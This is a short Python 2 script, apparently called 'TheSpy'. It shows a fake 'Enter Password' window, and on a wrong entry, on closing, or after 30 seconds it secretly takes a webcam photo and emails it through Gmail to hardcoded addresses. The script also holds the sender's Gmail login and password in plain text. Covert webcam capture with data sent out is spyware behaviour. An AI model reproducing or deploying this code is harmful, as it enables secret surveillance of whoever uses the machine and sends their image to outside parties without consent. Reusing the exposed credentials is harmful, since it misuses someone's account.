import cv2
import os
from Tkinter import *
import tkMessageBox
import random
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import multiprocessing

rnum=random.randrange(20,100,1)
imgname="TheSpy"+str(rnum)+".png"

def start_time():
        time.sleep(30)
	capture()
	p1.terminate()
	p1.join()
        print(" Yess ")
	exit()


def mailme(imgname):
	fromaddr = "kattademane@gmail.com"
	toaddr = "prathamanchan22@gmail.com,prathamanchan1997@gmail.com"
	msg = MIMEMultipart()
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "THe Spy "+str(rnum)
	body = ": )"
 

	msg.attach(MIMEText(body, 'plain'))
	filename = "THeSpy"
	location="/home/samsung/Downloads/Security-20180908T165700Z-001/ComputerSecurity/"+imgname
	attachment = open(location, "rb")
	p = MIMEBase('application', 'octet-stream')
	p.set_payload((attachment).read())
	encoders.encode_base64(p)  
	p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
	msg.attach(p)
	s = smtplib.SMTP('smtp.gmail.com', 587)
	s.starttls()
	s.login(fromaddr, "pratham@1997")
	text = msg.as_string()
	s.sendmail(fromaddr, toaddr, text)
	s.quit()


def goDude():
	if E1.get()=="hello":
		exit()

	else:
		camera=cv2.VideoCapture(0)
		rv,image=camera.read()
		del(camera)
		cv2.imwrite(imgname,image)
		mailme(imgname)
		time.sleep(1)
		cmd="mv "+imgname+" continue1"+str(rnum)
		os.system(cmd)
		exit()

def on_closing():
	capture()
	if tkMessageBox.askokcancel("Quit", "Do you want to quit?"):
	        root.destroy()


def capture():
	camera=cv2.VideoCapture(0)
        rv,image=camera.read()
	del(camera)
        rnum=random.randrange(20,100,1)
        cv2.imwrite(imgname,image)
	mailme(imgname)
	cmd="mv "+imgname+" close"+str(rnum)
        os.system(cmd)
        time.sleep(1)

if __name__ == "__main__":
    p1 = multiprocessing.Process(target=start_time)
    p1.start()
    root=Tk()
    topframe=Frame(root)
    topframe.pack()
    bottomframe=Frame(root)
    bottomframe.pack(side=BOTTOM)
    E1=Entry(topframe,bd=5)

    L1=Label(topframe,text="Enter Password")
    continuebutton=Button(bottomframe,text="Continue",fg="black",command=goDude)
    closebutton=Button(bottomframe,text="Close",fg="black",command=capture)

    L1.pack(side=LEFT)
    E1.pack(side=RIGHT)

    continuebutton.pack(side=LEFT)
    closebutton.pack(side=RIGHT)

    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()
